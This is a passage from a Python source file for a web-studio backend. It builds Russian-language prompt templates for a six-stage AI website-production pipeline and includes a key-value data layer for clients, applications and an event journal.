        "output": "1. Чистый HTML/CSS/JS без ошибок в консоли.\n"
                  "2. Мета-теги: title, description, H1-H2, Open Graph, favicon.\n"
                  "3. Семантическая разметка и alt-тексты изображений.\n"
                  "4. Оптимизация изображений и отсутствие лишних зависимостей.\n"
                  "5. Доступность: контраст, фокус, подписи полей.\n"
                  "6. Отчёт: что исправлено.",
        "next": "Оптимизированный сайт передаётся в промпт №5 (Функции и интеграции).",
        "criteria": "Нет ошибок консоли и горизонтального скролла, SEO-основа заполнена, "
                    "скорость приемлемая, дизайн и тексты не изменены."},
    5: {"name": "Функции и интеграции",
        "role": "Ты - frontend-разработчик по интеграциям.",
        "goal": "Подключить ТОЛЬКО те функции, которые входят в тариф или куплены отдельно.",
        "output": "1. Рабочая форма заявки с валидацией и состояниями успеха/ошибки.\n"
                  "2. Подключение купленных опций из списка ниже.\n"
                  "3. Кнопки связи: телефон, мессенджеры.\n"
                  "4. Отчёт: что подключено и что требует ключей/доступов владельца.",
        "next": "Готовый сайт с функциями передаётся в промпт №6 (QA и правки).",
        "criteria": "Все включённые функции работают; неоплаченные функции не добавлены; "
                    "указано, для чего нужны внешние ключи."},
    6: {"name": "QA и правки",
        "role": "Ты - главный контролёр качества ONYX.",
        "goal": "Провести финальную проверку и внести единый пакет согласованных правок клиента.",
        "output": "1. Вердикт PASS / FAIL.\n"
                  "2. Критические ошибки (если есть).\n"
                  "3. Некритические улучшения.\n"
                  "4. Что исправлено.\n"
                  "5. Готовность: К ПРЕЗЕНТАЦИИ / К ПУБЛИКАЦИИ / НЕ ГОТОВ.\n"
                  "6. Если переданы правки клиента - внести их и подтвердить выполнение по пунктам.",
        "next": "После PASS - код в GitHub, деплой в Vercel, подключение домена.",
        "criteria": "Нет критических ошибок, состав соответствует тарифу, факты соответствуют "
                    "данным клиента, все согласованные правки внесены."},
}


def detect_content_mode(d):
    """FULL / PARTIAL / NO_CONTENT - по заполненности анкеты и наличию материалов."""
    core = [d.get("company_name"), d.get("niche"), d.get("city"),
            d.get("main_services"), d.get("advantages"), d.get("target_audience")]
    core_filled = sum(1 for x in core if (x or "").strip())
    materials = sum(1 for k in ("has_logo", "has_photos", "has_portfolio", "has_reviews", "documents")
                    if d.get(k) == "Да, есть")
    rich = sum(1 for k in ("trust_facts", "objections", "style_wishes", "guarantees",
                           "experience", "stages", "special_offer")
               if (d.get(k) or "").strip())
    if core_filled >= 5 and materials >= 3 and rich >= 3:
        return "FULL_CONTENT"
    if core_filled >= 3 or materials >= 1:
        return "PARTIAL_CONTENT"
    return "NO_CONTENT"


def detect_design_mode(uid):
    """INDIVIDUAL_CLAUDE, если куплена опция «Индивидуальный дизайн»."""
    p = user_get(uid) or {}
    bought = set(p.get("purchased_services") or []) | set(cart_get(uid) or [])
    for o in p.get("orders", []):
        o_ = order_get(o) or {}
        if any("дизайн" in str(x).lower() for x in o_.get("items", [])):
            return "INDIVIDUAL_CLAUDE"
    return "INDIVIDUAL_CLAUDE" if "design" in bought else "STANDARD"


def purchased_options_list(uid):
    """Список купленных/выбранных опций (названия для промптов)."""
    p = user_get(uid) or {}
    ids = set(p.get("purchased_services") or []) | set(cart_get(uid) or [])
    names = [SERVICE[i]["name"] for i in ids if i in SERVICE]
    for o in p.get("orders", []):
        for it in (order_get(o) or {}).get("items", []):
            if isinstance(it, str) and not it.startswith("Тариф:") and it not in names:
                names.append(it)
    return names


def build_master_prompt(n, uid, d=None, client_changes=""):
    """Собрать промпт №n по фиксированному шаблону + профиль тарифа + режимы."""
    d = d or (_get(f"onyx:quest:{uid}") or {})
    p = user_get(uid) or {}
    tid = p.get("chosen_tariff") or "start"
    prof = TARIFF_PROFILES.get(tid, TARIFF_PROFILES["start"])
    tpl = MASTER_TEMPLATES[n]
    cmode = detect_content_mode(d)
    dmode = detect_design_mode(uid)
    opts = purchased_options_list(uid)
    missing = factory_missing_data(d)

    parts = [
        f"# ONYX - ПРОМПТ №{n}: {tpl['name'].upper()}",
        f"(шаблон v{PROMPTS_VERSION} · профиль {prof['code']} «{prof['name']}» · {cmode} · {dmode})",
        "",
        f"РОЛЬ: {tpl['role']}",
        "",
        f"ЦЕЛЬ ЭТАПА: {tpl['goal']}",
        "",
        "ВХОДНЫЕ ДАННЫЕ КЛИЕНТА:",
        factory_client_data_block(uid, d),
        "",
        "МАТЕРИАЛЫ КЛИЕНТА:",
        factory_drive_registry(uid, d),
        "",
        ONYX_COMMON_RULES,
        "",
        f"ПРАВИЛА ПРОФИЛЯ ТАРИФА ({prof['code']} - «{prof['name']}»):",
        f"- Структура: {prof['structure']}",
        f"- Уровень дизайна: {prof['design_level']}",
        f"- Технический уровень: {prof['tech_level']}",
        f"- Функции тарифа: {prof['features']}",
        f"- ОГРАНИЧЕНИЯ: {prof['limits']}",
        "",
        CONTENT_MODE_RULES[cmode],
    ]
    if n in (3, 6):
        parts += ["", DESIGN_MODE_RULES[dmode]]
    parts += ["", "КУПЛЕННЫЕ ОПЦИИ: " + (", ".join(opts) if opts else "нет дополнительных опций")]
    if n == 5:
        parts += ["ВНИМАНИЕ: подключать ТОЛЬКО функции тарифа и купленные опции из списка выше. "
                  "Ничего сверх этого не добавлять."]
    if n == 6 and client_changes:
        parts += ["", "ПРАВКИ КЛИЕНТА (внести одним пакетом):", client_changes,
                  "Правила правок: менять только указанное; не пересобирать сайт; при конфликте "
                  "правок - сначала перечислить конфликт; после правок перепроверить формы и адаптив."]
    parts += [
        "",
        "ЗАПРЕТЫ: выдумывать факты; добавлять неоплаченные функции; менять состав тарифа; "
        "оставлять заглушки и lorem ipsum; ломать адаптив, формы и ссылки.",
        "",
        "ФОРМАТ РЕЗУЛЬТАТА:",
        tpl["output"],
        "",
        f"ЧТО ПЕРЕДАЁТСЯ ДАЛЬШЕ: {tpl['next']}",
        "",
        f"КРИТЕРИЙ ГОТОВНОСТИ (PASS): {tpl['criteria']}",
    ]
    if missing:
        parts += ["", "ОБРАБОТКА ОТСУТСТВУЮЩИХ ДАННЫХ - недостаёт:",
                  "\n".join(f"- {m}" for m in missing),
                  "Эти места пометить [НУЖНЫ ДАННЫЕ], выдумкой не заполнять."]
    return "\n".join(parts)


def build_all_prompts(uid, d=None, client_changes=""):
    """Собрать все 6 промптов. Возвращает dict {1..6: text}."""
    return {i: build_master_prompt(i, uid, d, client_changes) for i in range(1, 7)}


# --- Старая библиотека промптов (regламент FACTORY 4.0) - оставлена для справки ---
PROMPT_LIBRARY = {
    "P1": {"id": "P1_Архитектор_v1.0", "name": "Prompt №1 - Архитектор и ТЗ", "version": "1.0",
           "text": """Ты - стратег, conversion copywriter, UX-архитектор и специалист по сайтам для бизнеса.

ЗАДАЧА: на основании данных клиента и правил ниши подготовить полное персонализированное ТЗ для создания сайта. Пока не пиши код.

ДАННЫЕ КЛИЕНТА:
{{CLIENT_DATA_FROM_SHEETS}}

МАТЕРИАЛЫ GOOGLE DRIVE:
{{DRIVE_ASSET_REGISTRY}}

ПРАВИЛА НИШИ:
{{NICHE_MODULE}}

Сформируй:
1. Краткое позиционирование компании.
2. Целевую аудиторию, её боли, вопросы и возражения.
3. Главный оффер первого экрана и 3 варианта подзаголовка.
4. Главное целевое действие.
5. Структуру сайта по порядку блоков с задачей каждого блока.
6. Содержание каждого блока: заголовок, смысл, факты и CTA.
7. Карту доверия: отзывы, гарантии, команда, документы, портфолио.
8. Карту использования материалов: какие фото и файлы использовать в каких блоках.
9. Дизайн-направление: настроение, палитра, типографика, карточки, изображения и анимации.
10. Технические требования: мобильная версия, формы, контакты, SEO, доступность.
11. Список недостающих данных.

ПРАВИЛА:
- Не придумывай факты, отзывы, цифры, гарантии, цены и лицензии.
- Если данных нет, пометь [НУЖНЫ ДАННЫЕ].
- Структура должна вести к одному основному CTA.
- Сайт должен быть персонализирован под компанию, а не выглядеть типовым.

КРИТЕРИЙ PASS: ТЗ можно передать генератору сайта без дополнительных устных объяснений."""},
    "P2": {"id": "P2_Создание_v1.0", "name": "Prompt №2 - Создание первой версии", "version": "1.0",
           "text": """Ты - senior UX/UI designer и frontend-разработчик. Создай полноценную предварительную версию сайта на основании утверждённого ТЗ ниже.

ТЗ PROMPT №1:
{{OUTPUT_PROMPT_1}}

ПРИКРЕПЛЁННЫЕ МАТЕРИАЛЫ:
{{SELECTED_DRIVE_FILES}}

Требования:
- Реализуй все обязательные блоки и один основной путь к заявке.
- Используй реальные данные и материалы клиента.
- Не добавляй выдуманные отзывы, цены, кейсы и достижения.
- Создай выразительный, индивидуальный дизайн в заданном направлении.
- Обеспечь адаптивность для телефона, планшета и компьютера.
- Все кнопки, меню, формы и ссылки должны работать.
- Добавь базовые title, description, H1 и семантическую структуру.
- Не оставляй lorem ipsum, заглушки и технические комментарии на странице.

КРИТЕРИЙ PASS: сайт полностью открывается, содержит весь утверждённый контент, выглядит профессионально и готов к UX-проверке."""},
    "P3": {"id": "P3_UX_v1.0", "name": "Prompt №3 - UX и конверсия", "version": "1.0",
           "text": """Ты - эксперт по UX, конверсии и продажам. Проведи аудит текущего сайта, сверяясь с ТЗ Prompt №1. Сразу внеси необходимые улучшения в проект.

Проверь:
- понятен ли оффер за 5 секунд;
- соответствует ли первый экран реальной услуге и городу;
- логично ли расположены блоки;
- достаточно ли доверия до формы заявки;
- заметны ли CTA и не конкурируют ли они между собой;
- удобно ли изучать услуги и портфолио;
- сняты ли основные возражения;
- не перегружен ли текст;
- удобна ли мобильная версия.

Не меняй визуальную концепцию без необходимости и не придумывай новые факты.

КРИТЕРИЙ PASS: пользователь понимает предложение, доверяет компании и может без препятствий выполнить главное целевое действие."""},
    "P4": {"id": "P4_Дизайн_v1.0", "name": "Prompt №4 - Дизайн-полировка", "version": "1.0",
           "text": """Ты - арт-директор и senior UI designer. Полируй существующий сайт до уровня современной профессиональной веб-студии, не пересобирая проект заново.

Улучши:
- сетку, отступы и визуальный ритм;
- типографику и иерархию;
- качество карточек, кнопок и форм;
- контраст и читаемость;
- использование реальных фотографий клиента;
- композицию портфолио и отзывов;
- мобильную версию;
- умеренные анимации и состояния элементов.

Запрещено:
- менять факты и смысл оффера;
- использовать случайные стоковые изображения вместо материалов клиента без необходимости;
- перегружать сайт эффектами;
- ломать формы, ссылки и адаптив.

КРИТЕРИЙ PASS: сайт визуально цельный, персонализированный, хорошо читается и выглядит убедительно на всех экранах."""},
    "P5": {"id": "P5_Tech_QA_v1.0", "name": "Prompt №5 - Технический контроль", "version": "1.0",
           "text": """Ты - senior frontend engineer и технический QA. Проверь весь проект и исправь технические ошибки.

Обязательно проверь:
- сборку и отсутствие ошибок в консоли;
- мобильную адаптивность и отсутствие горизонтального скролла;
- меню, якоря, кнопки, формы, телефоны и мессенджеры;
- валидацию формы и состояния успеха/ошибки;
- корректность изображений и alt-текстов;
- title, description, H1-H2, favicon, Open Graph;
- базовую скорость и отсутствие тяжёлых лишних зависимостей;
- доступность: контраст, фокус, подписи полей;
- отсутствие тестовых данных и секретов в коде.

Не меняй утверждённый дизайн и тексты, кроме случаев, необходимых для исправления ошибки.

КРИТЕРИЙ PASS: проект стабильно работает, готов к preview-деплою и не имеет критических дефектов."""},
    "P6": {"id": "P6_Правки_v1.0", "name": "Prompt №6 - Пакет правок клиента", "version": "1.0",
           "text": """Внеси единый пакет согласованных правок в существующий проект.

ПРАВКИ КЛИЕНТА:
{{CLIENT_CHANGE_LIST}}

НОВЫЕ МАТЕРИАЛЫ:
{{NEW_DRIVE_FILES}}

Правила:
- Измени только то, что относится к списку правок.
- Не пересобирай сайт и не меняй согласованную концепцию.
- Если правки противоречат друг другу или требуют новой функции, сначала перечисли конфликт.
- Новые факты и материалы используй только из переданных файлов.
- После изменений повторно проверь формы, адаптив и связанные блоки.

КРИТЕРИЙ PASS: все согласованные правки выполнены, остальные части сайта не ухудшились."""},
    "QA": {"id": "QA_Final_v1.0", "name": "Финальный QA", "version": "1.0",
           "text": """Ты - главный контролёр качества ONYX. Проведи финальную проверку сайта перед презентацией или публикацией.

Сравни сайт с:
1. ТЗ Prompt №1.
2. Правилами ниши.
3. Чек-листом качества.
4. Списком правок клиента.

Проверь фактическую точность, структуру, UX, дизайн, адаптивность, формы, контакты, SEO, изображения, орфографию, ссылки и отсутствие выдуманных данных.

Выдай итог в формате:
- PASS / FAIL;
- критические ошибки;
- некритические улучшения;
- что было исправлено;
- готовность: К ПРЕЗЕНТАЦИИ / К ПУБЛИКАЦИИ / НЕ ГОТОВ.

Если можешь исправить ошибки самостоятельно - исправь и проведи повторную проверку.

КРИТЕРИЙ PASS: нет критических ошибок, сайт соответствует данным клиента и готов к заявленному этапу."""},
}

# Порядок промптов в конвейере и статус, который ставится после PASS
PROMPT_FLOW = [("P1", "prompt1_ready"), ("P2", "site_created"), ("P3", "ux_done"),
               ("P4", "design_done"), ("P5", "tech_qa_passed"), ("P6", "changes_applied"),
               ("QA", "final_qa")]


def factory_missing_data(d):
    """Список недостающих данных для Prompt №1 (регламент: [НУЖНЫ ДАННЫЕ])."""
    need = []
    checks = [
        ("company_name", "название компании"), ("niche", "ниша"), ("city", "город"),
        ("main_services", "услуги"), ("priority_services", "приоритетная услуга"),
        ("target_audience", "целевая аудитория"), ("advantages", "преимущества"),
        ("trust_facts", "гарантии/опыт/процесс работы"),
        ("main_action", "главное целевое действие"), ("phone", "телефон"),
    ]
    for k, label in checks:
        if not (d.get(k) or "").strip():
            need.append(label)
    soft = [("style_wishes", "пожелания по стилю")]
    for k, label in soft:
        if not (d.get(k) or "").strip():
            need.append(label + " (желательно)")
    if d.get("has_logo") != "Да, есть":
        need.append("логотип")
    if d.get("has_photos") != "Да, есть":
        need.append("фото компании")
    if d.get("has_portfolio") != "Да, есть":
        need.append("портфолио")
    if d.get("has_reviews") != "Да, есть":
        need.append("отзывы")
    return need


def factory_client_data_block(uid, d):
    """Блок «ДАННЫЕ КЛИЕНТА» - подставляется в {{CLIENT_DATA_FROM_SHEETS}}."""
    p = user_get(uid) or {}
    contacts = " · ".join(x for x in [d.get("phone", ""), d.get("messengers", ""),
                                      d.get("email", ""), d.get("address", "")] if x)
    # Обязательные поля - их анкета собирает всегда. Пусто = реальный пробел,
    # поэтому помечаем [НУЖНЫ ДАННЫЕ], чтобы ИИ ничего не выдумывал.
    rows = [
        ("КОМПАНИЯ", d.get("company_name") or p.get("name", "")),
        ("НИША", d.get("niche", "")),
        ("ГОРОД", d.get("city", "")),
        ("ГЕОГРАФИЯ РАБОТЫ", d.get("geo", "")),
        ("УСЛУГИ", d.get("main_services", "")),
        ("ПРИОРИТЕТНАЯ УСЛУГА", d.get("priority_services", "")),
        ("ЦЕЛЕВАЯ АУДИТОРИЯ", d.get("target_audience", "")),
        ("ПРЕИМУЩЕСТВА", d.get("advantages", "")),
        ("ГАРАНТИИ, ОПЫТ, КАК СТРОИТСЯ РАБОТА, ВОЗРАЖЕНИЯ",
         d.get("trust_facts") or d.get("guarantees", "")),
        ("ГЛАВНЫЙ CTA", d.get("main_action", "")),
        ("ЦЕНЫ НА САЙТЕ", d.get("show_prices", "")),
        ("КОНТАКТЫ", contacts),
        ("ДИЗАЙН / СТИЛЬ", d.get("style_preferences", "")),
        ("ДОМЕН", (d.get("has_domain", "") + " " + d.get("domain_name", "")).strip()),
    ]
    # Необязательные поля - анкета их не спрашивает. Показываем ТОЛЬКО если они есть
    # (например, заполнены менеджером или пришли из старой анкеты). Иначе не шумим.
    optional = [
        ("РЕФЕРЕНСЫ", d.get("reference_sites", "")),
        ("ЦВЕТА", d.get("color_preferences", "")),
        ("СРЕДНИЙ ЧЕК", d.get("avg_check", "")),
        ("ТИПИЧНЫЙ ЗАПРОС", d.get("typical_request", "")),
        ("ВОЗРАЖЕНИЯ", d.get("objections", "")),
        ("ОПЫТ И КОМАНДА", d.get("experience", "")),
        ("ЭТАПЫ РАБОТЫ", d.get("stages", "")),
        ("АКЦИЯ / СПЕЦПРЕДЛОЖЕНИЕ", d.get("special_offer", "")),
        ("ГРАФИК РАБОТЫ", d.get("working_hours", "")),
        ("СОЦСЕТИ", d.get("social_links", "")),
        ("ОБЯЗАТЕЛЬНО НА САЙТЕ", d.get("must_have", "")),
        ("ЗАПРЕЩЕНО НА САЙТЕ", d.get("must_not_have", "")),
        ("SEO-ЗАПРОСЫ", d.get("seo_queries", "")),
        ("ДОП. ФУНКЦИИ", d.get("additional_functions", "")),
    ]
    rows += [(k, v) for k, v in optional if (v or "").strip()]
    out = "\n".join(f"{k}: {v or '[НУЖНЫ ДАННЫЕ]'}" for k, v in rows)
    # Нишевой блок анкеты - специфика отрасли, без неё промпт получается общим
    nid = p.get("client_niche")
    block = NICHE_BLOCKS.get(nid or "", {}).get("steps", [])
    extra_keys = [s["key"] for s in block] + [s["key"] for s in
                  GOAL_EXTRA_STEPS.get(p.get("client_goal") or "", [])]
    seen, niche_rows = set(), []
    for k in extra_keys:
        if k in seen:
            continue
        seen.add(k)
        label = NICHE_LABELS.get(k) or BRIEF_LABELS.get(k) or k
        label = label.split(" ", 1)[-1].upper()
        niche_rows.append(f"{label}: {d.get(k) or '[НУЖНЫ ДАННЫЕ]'}")
    if niche_rows:
        out += (f"\n\nСПЕЦИФИКА НИШИ ({NICHE_RU.get(nid, nid)}):\n" + "\n".join(niche_rows))
    return out


def factory_drive_registry(uid, d):
    """Реестр материалов Drive - {{DRIVE_ASSET_REGISTRY}}. Ссылки заполняет оператор."""
    links = (_get(f"onyx:drive:{uid}") or {})
    def row(label, key, note):
        url = links.get(key, "")
        state = url if url else ("есть у клиента - ссылку добавить" if note == "yes" else "нет")
        return f"- {label}: {state}"
    return "\n".join([
        row("Логотип и бренд", "logo_url", "yes" if d.get("has_logo") == "Да, есть" else "no"),
        row("Фото компании", "photos_url", "yes" if d.get("has_photos") == "Да, есть" else "no"),
        row("Портфолио (объекты, до/после)", "portfolio_urls", "yes" if d.get("has_portfolio") == "Да, есть" else "no"),
        row("Отзывы (скриншоты/ссылки)", "reviews_url", "yes" if d.get("has_reviews") == "Да, есть" else "no"),
        row("Документы и сертификаты", "documents_url", "yes" if d.get("documents") == "Да, есть" else "no"),
    ])


def build_prompt_1(uid, d=None, niche_module=""):
    """Собрать готовый PROMPT №1 (значение колонки PROMPT_1_READY)."""
    d = d or (_get(f"onyx:quest:{uid}") or {})
    text = PROMPT_LIBRARY["P1"]["text"]
    text = text.replace("{{CLIENT_DATA_FROM_SHEETS}}", factory_client_data_block(uid, d))
    text = text.replace("{{DRIVE_ASSET_REGISTRY}}", factory_drive_registry(uid, d))
    missing = factory_missing_data(d)
    niche = niche_module or f"Ниша: {d.get('niche', '-')}. Особые правила ниши не заданы - " \
                           "используй общие стандарты ONYX и не выдумывай факты."
    text = text.replace("{{NICHE_MODULE}}", niche)
    if missing:
        text += "\n\nНЕДОСТАЮЩИЕ ДАННЫЕ (пометить [НУЖНЫ ДАННЫЕ]):\n" + \
                "\n".join(f"- {m}" for m in missing)
    return text


def factory_get(uid):
    return _get(f"onyx:factory:{uid}")


def factory_save(f):
    f["updated_at"] = now_str()
    _set(f"onyx:factory:{f['telegram_id']}", f, ttl=YEAR)
    sheet_factory(f)
    return f


def sheet_factory(f):
    """Выгрузка строки клиента в лист Factory (одна строка = один клиент)."""
    row = {c: f.get(c, "") for c in FACTORY_COLUMNS}
    row["Lead_ID"] = f.get("Lead_ID") or f.get("telegram_id", "")
    sheet_post("Factory", row)


def build_prompts_row(uid, d=None, regenerate=False, client_changes=""):
    """Собрать 6 промптов и вернуть строку для листа Prompts (схема A-X из ТЗ)."""
    d = d or (_get(f"onyx:quest:{uid}") or {})
    p = user_get(uid) or {}
    prev = _get(f"onyx:prompts:{uid}") or {}
    # ТЗ п.7.8: не перезаписывать готовые промпты без regenerate
    if prev.get("generation_status") == "READY" and not regenerate:
        return prev
    tid = p.get("chosen_tariff") or "start"
    prof = TARIFF_PROFILES.get(tid, TARIFF_PROFILES["start"])
    row = {
        "timestamp": now_str(),
        "order_id": (p.get("orders") or [""])[-1] if p.get("orders") else "",
        "telegram_id": uid,
        "company_name": d.get("company_name", ""),
        "niche": d.get("niche", ""),
        "city": d.get("city", ""),
        "tariff_profile": prof["code"],
        "tariff_name": prof["name"],
        "content_mode": detect_content_mode(d),
        "design_mode": detect_design_mode(uid),
        "purchased_options": ", ".join(purchased_options_list(uid)) or "-",
        "services": d.get("main_services", ""),
        "advantages": d.get("advantages", ""),
        "contacts": " · ".join(x for x in [d.get("phone", ""), d.get("messengers", ""),
                                           d.get("email", "")] if x),
        "drive_folder_url": (_get(f"onyx:drive:{uid}") or {}).get("folder_url", ""),
        "generation_status": "PROCESSING", "error_message": "",
        "prompts_generated_at": "", "prompts_version": PROMPTS_VERSION,
    }
    try:
        prompts = build_all_prompts(uid, d, client_changes)
        for i in range(1, 7):
            row[f"prompt_{i}"] = prompts[i]
        row["generation_status"] = "READY"
        row["prompts_generated_at"] = now_str()
    except Exception as e:
        row["generation_status"] = "ERROR"
        row["error_message"] = f"{type(e).__name__}: {e}"[:300]
        log_error("prompts", f"генерация для id {uid}: {e}", notify=True)
    _set(f"onyx:prompts:{uid}", row, ttl=YEAR)
    sheet_post("Prompts", row)
    return row


def factory_upsert_from_questionnaire(uid, d, username=""):
    """Анкета заполнена → строка в Factory + собранный PROMPT_1_READY."""
    p = user_get(uid) or {}
    missing = factory_missing_data(d)
    contacts = " · ".join(x for x in [d.get("phone", ""), d.get("messengers", ""), d.get("email", "")] if x)
    links = _get(f"onyx:drive:{uid}") or {}
    f = factory_get(uid) or {}
    f.update({
        "telegram_id": uid, "Lead_ID": p.get("core_client_id") or uid,
        "company_name": d.get("company_name", ""), "niche": d.get("niche", ""),
        "city": d.get("city", ""), "geo": d.get("geo", ""),
        "services": d.get("main_services", ""), "priority_service": d.get("priority_services", ""),
        "target_audience": d.get("target_audience", ""), "avg_check": d.get("avg_check", ""),
        "typical_request": d.get("typical_request", ""), "objections": d.get("objections", ""),
        "advantages": d.get("advantages", ""), "guarantees": d.get("guarantees", ""),
        "experience": d.get("experience", ""), "stages": d.get("stages", ""),
        "CTA": d.get("main_action", ""), "show_prices": d.get("show_prices", ""),
        "special_offer": d.get("special_offer", ""),
        "phone": d.get("phone", ""), "messengers": d.get("messengers", ""),
        "email": d.get("email", ""), "address": d.get("address", ""),
        "working_hours": d.get("working_hours", ""), "social_links": d.get("social_links", ""),
        "design_style": d.get("style_preferences", ""), "colors": d.get("color_preferences", ""),
        "references": d.get("reference_sites", ""), "must_have": d.get("must_have", ""),
        "must_not_have": d.get("must_not_have", ""), "seo_queries": d.get("seo_queries", ""),
        "additional_functions": d.get("additional_functions", ""),
        "has_domain": d.get("has_domain", ""), "domain_name": d.get("domain_name", ""),
        "has_logo": d.get("has_logo", ""), "has_photos": d.get("has_photos", ""),
        "has_portfolio": d.get("has_portfolio", ""), "has_reviews": d.get("has_reviews", ""),
        "documents": d.get("documents", ""),
        "logo_url": links.get("logo_url", ""), "portfolio_urls": links.get("portfolio_urls", ""),
        "reviews_url": links.get("reviews_url", ""), "documents_url": links.get("documents_url", ""),
        "photos_url": links.get("photos_url", ""),
        "missing_data": ", ".join(missing) if missing else "-",
        "factory_status": "waiting_materials" if missing else "data_ready",
        "PROMPT_1_READY": build_prompt_1(uid, d),
        "created_at": f.get("created_at") or now_str(),
    })
    factory_save(f)
    try:
        cid = client_id_of(uid)
        journal_add(cid, "factory_row_ready", extra=f.get("factory_status", ""))
    except Exception as e:
        print("factory journal err", e)
    return f


def factory_set_status(uid, status, actor="admin"):
    f = factory_get(uid)
    if not f:
        return None
    prev = f.get("factory_status")
    if prev == status:
        return f
    f["factory_status"] = status
    factory_save(f)
    try:
        journal_add(client_id_of(uid), "factory_status", prev=prev, new=status, extra=actor)
        create_task("production", uid, f"Конвейер: {FACTORY_STATUS_RU.get(status, status)} - id {uid}",
                    description=f"Клиент: {f.get('company_name', '')}. Предыдущий этап: "
                                f"{FACTORY_STATUS_RU.get(prev, prev or '-')}",
                    telegram_id=uid, priority="normal", notify=True)
    except Exception as e:
        print("factory status err", e)
    return f


# ============================================================================
#  CORE DATA LAYER (Этап 1): раздельные ID, сущности, версии, журнал, дедуп
#  Аддитивный слой поверх KV. Сосуществует со старыми структурами (onyx:user/order).
#  Ключи: onyx:client:{cid}, onyx:app:{aid}, onyx:sitelead:{lid}, onyx:quest2:{qid},
#         onyx:journal:{cid}. Индексы: tg2client / phone2client / email2client / watoken.
# ============================================================================
def _next_id(kind):
    """Отдельная последовательность для каждого типа ID (client/application/lead/quest)."""
    if KV_URL:
        n = _redis("INCR", f"onyx:seq:{kind}")
        return int(n) if n else 1
    seqs = _MEM.setdefault("_seq2", {})
    seqs[kind] = seqs.get(kind, 0) + 1
    return seqs[kind]


def _digits(s):
    return re.sub(r"\D", "", s or "")


# ---- Журнал событий (append-only, по client_id) ----
def journal_add(client_id, event, application_id=None, prev=None, new=None, extra=None):
    rec = {"client_id": client_id, "application_id": application_id or "", "event": event,
           "prev_state": prev or "", "new_state": new or "", "extra": extra or "",
           "created_at": now_str()}
    try:
        if KV_URL:
            _redis("RPUSH", f"onyx:journal:{client_id}", json.dumps(rec, ensure_ascii=False))
            _redis("LTRIM", f"onyx:journal:{client_id}", "-300", "-1")
        else:
            _MEM.setdefault(f"jr:{client_id}", []).append(rec)
        if EVENT_SHEET_ON:
            sheet_post("Events", {"event_id": "", "telegram_id": "", "client_id": client_id,
                                  "application_id": rec["application_id"], "event_type": event,
                                  "event_data": f"{prev or ''}->{new or ''} {extra or ''}".strip(),
                                  "created_at": rec["created_at"]})
    except Exception as e:
        print("journal_add err", e)
    return rec


def journal_get(client_id, n=50):
    if KV_URL:
        r = _redis("LRANGE", f"onyx:journal:{client_id}", str(-n), "-1") or []
        out = []
        for x in r:
            try:
                out.append(json.loads(x))
            except Exception:
                pass
        return out
    return _MEM.get(f"jr:{client_id}", [])[-n:]


# ---- Клиент (client_id ≠ telegram_id) ----
def client_get(cid):
    return _get(f"onyx:client:{cid}") if cid else None


def sheet_core_client(c):
    sheet_post("ClientsCore", {
        "client_id": c.get("client_id", ""), "telegram_id": c.get("telegram_id", ""),
        "name": c.get("name", ""), "username": c.get("username", ""),
        "phone": c.get("phone", ""), "email": c.get("email", ""), "whatsapp": c.get("whatsapp", ""),
        "source": c.get("source", ""), "current_stage": c.get("current_stage", ""),
        "cabinet_created": c.get("cabinet_created", False),
        "first_contact_at": c.get("first_contact_at", ""), "last_contact_at": c.get("last_contact_at", ""),
        "created_at": c.get("created_at", ""), "updated_at": c.get("updated_at", ""),
    })


def client_save(c):
    c["updated_at"] = now_str()
    _set(f"onyx:client:{c['client_id']}", c, ttl=YEAR)
    sheet_core_client(c)
    return c


def _index_client(c):
    cid = c["client_id"]
    if c.get("telegram_id"):
        _set(f"onyx:tg2client:{c['telegram_id']}", cid, ttl=YEAR)
    if c.get("phone"):
        _set(f"onyx:phone2client:{_digits(c['phone'])}", cid, ttl=YEAR)
    if c.get("email"):
        _set(f"onyx:email2client:{c['email'].lower()}", cid, ttl=YEAR)
    if KV_URL:
        _redis("SADD", "onyx:clients_all", str(cid))
    else:
        _MEM.setdefault("_clients_all", set()).add(cid)


def client_by_tg(tg):
    cid = _get(f"onyx:tg2client:{tg}") if tg else None
    return client_get(cid) if cid else None


def client_by_contact(phone=None, email=None):
    if phone:
        cid = _get(f"onyx:phone2client:{_digits(phone)}")
        if cid:
            return client_get(cid)
    if email:
        cid = _get(f"onyx:email2client:{email.lower()}")
        if cid:
            return client_get(cid)
    return None


def client_link_tg(cid, tg):
    c = client_get(cid)
    if c and tg:
        c["telegram_id"] = tg
        _set(f"onyx:tg2client:{tg}", cid, ttl=YEAR)
        client_save(c)
    return c


def client_get_or_create(telegram_id=None, source="", name="", phone="", email="",
                         username="", whatsapp=""):
    """Дедуп: сначала по Telegram, затем по телефону/email. Не плодит клиентов."""
    c = client_by_tg(telegram_id) if telegram_id else None
    if not c:
        c = client_by_contact(phone, email)
        if c and telegram_id and not c.get("telegram_id"):
            client_link_tg(c["client_id"], telegram_id)
    if c:
        changed = False
        for k, v in (("name", name), ("phone", phone), ("email", email),
                     ("username", username), ("whatsapp", whatsapp)):
            if v and not c.get(k):
                c[k] = v; changed = True
        if changed:
            _index_client(c); client_save(c)
        return c
    cid = _next_id("client")
    c = {"client_id": cid, "telegram_id": telegram_id or "", "username": username, "name": name,
         "phone": phone, "email": email, "whatsapp": whatsapp, "source": source,
         "first_contact_at": now_str(), "cabinet_created": False, "current_stage": "new",
         "last_contact_at": now_str(), "consents": "", "comment": "", "created_at": now_str()}
    _index_client(c)
    client_save(c)
    journal_add(cid, "client_created", extra=source)
    return c


def client_set_stage(cid, stage):
    c = client_get(cid)
    if c and c.get("current_stage") != stage:
        prev = c.get("current_stage")
        c["current_stage"] = stage
        c["last_contact_at"] = now_str()
        client_save(c)
        journal_add(cid, "stage_change", prev=prev, new=stage)
    return c


# ---- Заявка (application) с версиями (старые не удаляем) ----
def app_amount(tariff_id, options):
    total = 0
    if tariff_id in TARIFF:
        total += TARIFF[tariff_id]["price"]
    for o in (options or []):
        if o in SERVICE:
            total += SERVICE[o]["price"]
    return total


def application_get(aid):
    return _get(f"onyx:app:{aid}") if aid else None


def sheet_core_app(a):
    sheet_post("Applications", {
        "application_id": a.get("application_id", ""), "client_id": a.get("client_id", ""),
        "number": a.get("number", ""), "questionnaire_id": a.get("questionnaire_id", ""),
        "tariff_id": a.get("tariff_id", ""), "options": ", ".join(a.get("options", [])),
        "amount": a.get("amount", 0), "status": a.get("status", ""), "stage": a.get("stage", ""),
        "version": a.get("version", 1), "parent_application_id": a.get("parent_application_id", ""),
        "source": a.get("source", ""), "created_at": a.get("created_at", ""),
        "updated_at": a.get("updated_at", ""),
    })


def application_save(a):
    a["updated_at"] = now_str()
